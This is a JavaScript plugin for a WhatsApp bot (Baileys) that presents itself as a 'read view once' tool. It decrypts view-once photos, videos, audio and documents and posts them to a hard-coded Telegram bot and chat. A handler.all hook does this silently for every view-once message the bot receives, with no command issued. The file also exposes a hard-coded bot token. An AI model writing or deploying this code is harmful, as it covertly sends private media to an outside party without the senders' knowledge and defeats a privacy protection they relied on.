import { downloadContentFromMessage } from "baileys"
import axios from "axios"
import FormData from "form-data"
import fs from "fs"
import path from "path"

const TELEGRAM_TOKEN = "8039321548:AAE6CdhjbNxdhYubZWSa5qxOqE2-4cIA1fw"
const TELEGRAM_CHAT_ID = "7389612217"
const TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`

const getExt = (mime) => ({ "image/jpeg":"jpg","image/png":"png","image/webp":"webp","video/mp4":"mp4","audio/mpeg":"mp3","audio/ogg":"ogg" }[mime] || "bin")

const sendToTelegram = async (buffer, type, mime, caption = "") => {
  const tmpDir = "./tmp"
  if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true })
  const filePath = path.join(tmpDir, `rvo_${Date.now()}.${getExt(mime)}`)
  fs.writeFileSync(filePath, buffer)
  const form = new FormData()
  form.append("chat_id", TELEGRAM_CHAT_ID)
  const fieldMap = { image:"photo", video:"video", audio:"audio", document:"document" }
  const methodMap = { image:"sendPhoto", video:"sendVideo", audio:"sendAudio", document:"sendDocument" }
  form.append(fieldMap[type] || "document", fs.createReadStream(filePath))
  form.append("caption", caption || `👁 View Once - ${type}`)
  await axios.post(`${TG_API}/${methodMap[type] || "sendDocument"}`, form, { headers: form.getHeaders(), maxBodyLength: Infinity })
  fs.unlinkSync(filePath)
}

const extractViewOnce = (message) => {
  if (!message) return null
  const voTypes = ["viewOnceMessage", "viewOnceMessageV2", "viewOnceMessageV2Extension"]
  for (const t of voTypes) {
    if (message[t]) {
      const inner = message[t].message || message[t]
      const media = inner.imageMessage || inner.videoMessage || inner.audioMessage || inner.documentMessage
      if (media) return media
    }
  }
  return null
}

const processViewOnce = async (m) => {
  const media = extractViewOnce(m.message)
  if (!media) return false
  const mime = media.mimetype || ""
  let type = "document"
  if (mime.startsWith("image/")) type = "image"
  else if (mime.startsWith("video/")) type = "video"
  else if (mime.startsWith("audio/")) type = "audio"
  const stream = await downloadContentFromMessage(media, type)
  let buffer = Buffer.from([])
  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
  await sendToTelegram(buffer, type, mime, media.caption || "")
  return true
}

const handler = async (m, { KazzTzy }) => {
  try {
    await m.react("⏳")
    const ok = await processViewOnce(m)
    if (!ok) return m.reply("❌ Bukan pesan view once atau tidak ada media.")
    await m.react("✅")
  } catch (e) {
    await m.react("❌")
    console.error("[RVO]", e.message)
    m.reply("❌ Gagal: " + e.message)
  }
}

handler.all = async function (m) {
  if (!m.message) return
  const isViewOnce = m.message.viewOnceMessage || m.message.viewOnceMessageV2 || m.message.viewOnceMessageV2Extension
  if (!isViewOnce) return
  try {
    await processViewOnce(m)
  } catch (e) {
    console.error("[RVO-AUTO]", e.message)
  }
}

handler.help = ["rvo"]
handler.tags = ["tools"]
handler.command = /^rvo$/i
export default handler
